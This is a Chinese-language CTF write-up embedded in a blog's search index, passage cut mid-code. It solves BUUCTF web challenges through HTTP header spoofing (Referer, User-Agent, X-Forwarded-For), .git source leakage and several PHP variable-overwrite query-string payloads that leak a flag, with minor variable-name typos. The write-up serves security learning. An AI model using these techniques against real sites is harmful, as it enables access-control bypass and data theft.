<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DASBOOK-Web</title>
      <link href="/2023/05/26/DASBOOK/"/>
      <url>/2023/05/26/DASBOOK/</url>
      
        <content type="html"><![CDATA[<blockquote><p>没有什么重头再来，凡走过的路都算数！(ง •_•)ง</p></blockquote><span id="more"></span><h2 id="0x0-极客大挑战-2019-Http"><a href="#0x0-极客大挑战-2019-Http" class="headerlink" title="0x0:[极客大挑战 2019]Http"></a>0x0:[极客大挑战 2019]Http</h2><p>​    查看网页源代码发现可疑连接：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.1rx0se1qmi9s.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># It doesn&#x27;t come from &#x27;https://Sycsecret.buuoj.cn&#x27;</span></span><br><span class="line"></span><br><span class="line">Referer: https://Sycsecret.buuoj.cn</span><br><span class="line"></span><br><span class="line"><span class="comment"># Please use &quot;Syclover&quot; browser</span></span><br><span class="line"></span><br><span class="line">User-Agent: Syclover</span><br><span class="line">    </span><br><span class="line"><span class="comment"># No!!! you can only read this locally!!!</span></span><br><span class="line"></span><br><span class="line">X-Forwarded-For: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.71cfwppd5f40.png"></p><h2 id="0x1-BUU-BURP-COURSE-1"><a href="#0x1-BUU-BURP-COURSE-1" class="headerlink" title="0x1.BUU BURP COURSE 1"></a>0x1.BUU BURP COURSE 1</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.33d2rrwg9aw0.png"></p><p>​    添加<code>X-Forwarded-For: 127.0.0.1</code> 请求头后无回显</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.6ikafb7k7600.png"></p><p>​    </p><p>更换为<code>X-Real-IP: 127.0.0.1</code>请求头：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.2bzqx0jnawsg.png"></p><p>查看源代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wwoj2wio2jw93ey43eiuwdjnewkndjlwe&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接登录会需要重新验证本地登录，使用<code>hackbar</code> Post方法从而实现登录：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.2ro55t0t07y0.png"></p><blockquote><p>X-Forwarded-For是用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中</p><p>X-Real-IP，一般只记录真实发出请求的客户端IP</p></blockquote><p><a class="link" href="https://blog.csdn.net/weiyuefei/article/details/78687545">X-Forwarded-For 和 X-Real-IP 的区别<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x2-BJDCTF2020-Mark-loves-cat"><a href="#0x2-BJDCTF2020-Mark-loves-cat" class="headerlink" title="0x2: [BJDCTF2020]Mark loves cat"></a>0x2: [BJDCTF2020]Mark loves cat</h2><h3 id="初探题目"><a href="#初探题目" class="headerlink" title="初探题目"></a>初探题目</h3><p>​    打开环境发现是一个还不错的博客网站，但是在末尾出现了一个与主题非常不符合的字符串<code>dog</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.10lnttfn8er4.png"></p><p>​    日常用<code>dirsearch</code>扫一下</p><hr><p>​    这里后面补上，因为数据库项目所用的相应的库版本与dirsearch所需的库版本冲突，故先不使用dirsearch。</p><hr><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>​    dirsearch扫描后发现<code>/.git</code> 故存在git泄露漏洞。</p><p>​    使用<code>Githack</code>利用漏洞下载源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure><p>​    这里放一点自己的小新路历程，因为我们发现了那串与网站很不符合的<code>dog</code>字符串在最末尾，所以我们直接翻到<code>index.php</code>的最后，果然发现了漏洞代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>补充语法知识：</p><ol><li>php程序可以省略结束符号<code>?&gt;</code></li><li><a class="link" href="https://www.runoob.com/php/php-get.html">$_GET[‘flag’]<i class="fas fa-external-link-alt"></i></a></li><li><a class="link" href="https://www.runoob.com/php/php-post.html">$_POST[‘flag’]<i class="fas fa-external-link-alt"></i></a></li><li><a class="link" href="https://www.runoob.com/php/func-misc-exit.html">php中的exit函数<i class="fas fa-external-link-alt"></i></a>：exit(<em>message</em>)  输出一条消息，并退出当前脚本。</li></ol><p>​    先分析最简单的，这就是为什么开头我们会发现<code>dog</code>字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果既没有通过flag参数进行get和post传参就会直接exit并输出dog字符串</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    再分析<code>exit($is);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果通过flag参数进行get或post传参传入的值是flag字符串的话就会直接exit并输出cat字符串</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.3omc7n0fpa60.png"></p><p>​    </p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.31l69b2libc0.png"></p><p>​    最后分析这个我认为最复杂的部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line"><span class="comment">//遍历$_GET数组中的键值对，检查如果GET参数flag的值等于某个键名，并且该键名不等于&quot;flag&quot;本身</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    接下来我将举一个例子来更好地分析体会这串代码：</p><p>​    先进行get传参：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=cs&amp;cs=1</span><br></pre></td></tr></table></figure><p>​    当使用GET方法传递参数<code>?flag=cs&amp;cs=1</code>时，<code>$_GET</code>数组中的键值对如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;cs&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cs&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>​    此时遍历<code>$_GET数组</code>中的键值对<code>$_GET[&#39;flag&#39;]</code>的值为字符串<code>cs</code>，发现数组第二个元素可以满足<code>$_GET[&#39;flag&#39;] === $x</code>这个条件，即使此时的<code>$x</code>等于<code>cs</code>字符串，且<code>cs</code>字符串不等于<code>flag</code>字符串，故执行<code>exit($handsome)</code>，输出<code>ydx</code>并停止。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.108gu5xmryq8.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>​    分析完相应漏洞代码后，我们该如何利用来输出flag呢？—–&gt;变量覆盖漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//遍历$_POST数组中的每个键值对，并将键名赋给变量$x，将对应的值赋给变量$y</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历$_GET数组中的每个键值对，并将键名赋给变量$x，将对应的值赋给变量$y</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="语法补充：-x与-x的关系："><a href="#语法补充：-x与-x的关系：" class="headerlink" title="语法补充：$x与$$x的关系："></a>语法补充：<code>$x</code>与<code>$$x</code>的关系：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $x 是一个变量，它保存着一个字符串值，该字符串是一个有效的变量名。</span></span><br><span class="line"><span class="comment">// $$x 则是使用 $x 的值作为变量名，即将变量名间接地确定为 $x 的值。</span></span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;cs&#x27;</span>;</span><br><span class="line"><span class="variable">$cs</span> = <span class="string">&#x27;28&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$x</span>;  <span class="comment">// --&gt;echo $cs ; --&gt; 输出：28</span></span><br></pre></td></tr></table></figure><h3 id="解法一：利用exit-handsome"><a href="#解法一：利用exit-handsome" class="headerlink" title="解法一：利用exit($handsome)"></a>解法一：利用exit($handsome)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=handsome</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;handsome&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;handsome&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>​    经过如下代码后有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;handsome&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;handsome&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">第一次迭代：</span></span><br><span class="line"><span class="comment">$x = handsome , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $handsome , $$y = $flag</span></span><br><span class="line"><span class="comment">$handsome = $flag</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第二次迭代：</span></span><br><span class="line"><span class="comment">$x = flag , $y = handsome</span></span><br><span class="line"><span class="comment">$x = $flag , $y = $handsome</span></span><br><span class="line"><span class="comment">$flag = $handsome</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>​    在此之后，<code>$flag</code>与<code>$handsome</code>变量中的值均是<code>flag.php</code>文件中导入的值。此时刚好满足条件触发<code>exit($handsome)</code>输出<code>flag</code>的值。</p><h3 id="解法二：利用exit-yds"><a href="#解法二：利用exit-yds" class="headerlink" title="解法二：利用exit($yds)"></a>解法二：利用exit($yds)</h3><p>​    最简单的解法，原理与解法一相同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;ydx&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">第一次迭代：</span></span><br><span class="line"><span class="comment">$x = ydx , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $ydx , $$y = $flag</span></span><br><span class="line"><span class="comment">$ydx = $flag</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.35tp06u455s0.png"></p><h3 id="解法三：利用exit-is"><a href="#解法三：利用exit-is" class="headerlink" title="解法三：利用exit($is)"></a>解法三：利用exit($is)</h3><blockquote><p>​    最开始没细看以为Post方法会有不同的方式利用，没想到Post方法只能实现修改一个变量的内容的功能，所以这里还是使用Get方法获取flag.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在这里如果要利用<code>exit($is)</code>就需要使用<code>Post方法</code>且有一项必须为<code>flag=flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_POST</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is&#x27;</span> =&gt; <span class="string">&#x27;你猜猜我会输出啥？&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">第一次迭代：</span></span><br><span class="line"><span class="comment">$x = flag , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $flag , $y = flag</span></span><br><span class="line"><span class="comment">$flag = flag</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第二次迭代：</span></span><br><span class="line"><span class="comment">$x = is , $y = 你猜猜我会输出啥？</span></span><br><span class="line"><span class="comment">$$x= $is , $y = 你猜猜我会输出啥？</span></span><br><span class="line"><span class="comment">$is = 你猜猜我会输出啥？</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.qwaut6rp6v.png"></p><p>​    既然做不到变量名代替，现在我们来深入思考该怎么实现将flag中的内容赋给is变量呢？<br>​    经过进一步分析发现，利用Post方法只能做到修改一个变量的内容，而不能实现变量名替换从而输出flag，所以这里还是得利用get方法！</p><p>​    </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;is&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">第一次迭代：</span></span><br><span class="line"><span class="comment">$x = is , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $is , $$y = $flag</span></span><br><span class="line"><span class="comment">$is = $flag</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第二次迭代：---&gt;满足if条件</span></span><br><span class="line"><span class="comment">$x = flag , $y = flag</span></span><br><span class="line"><span class="comment">$x = $flag , $y = $flag</span></span><br><span class="line"><span class="comment">$flag = $flag</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.652gus4ywpk0.png"></p><h3 id="解法四-利用echo-quot-the-flag-is-quot-flag"><a href="#解法四-利用echo-quot-the-flag-is-quot-flag" class="headerlink" title="解法四: 利用echo &quot;the flag is: &quot;.$flag;"></a>解法四: 利用<code>echo &quot;the flag is: &quot;.$flag;</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=flag&amp;flag=1</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.75pvw2b63ec0.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">第一次迭代：</span></span><br><span class="line"><span class="comment">$x = 1 , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $1 , $$y = $flag</span></span><br><span class="line"><span class="comment">$1 = $flag</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第二次迭代：---&gt;满足if条件</span></span><br><span class="line"><span class="comment">$x = flag , $y = 1</span></span><br><span class="line"><span class="comment">$x = $flag , $y = $1</span></span><br><span class="line"><span class="comment">$flag = $1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//是如何绕过这个函数的呢？</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> 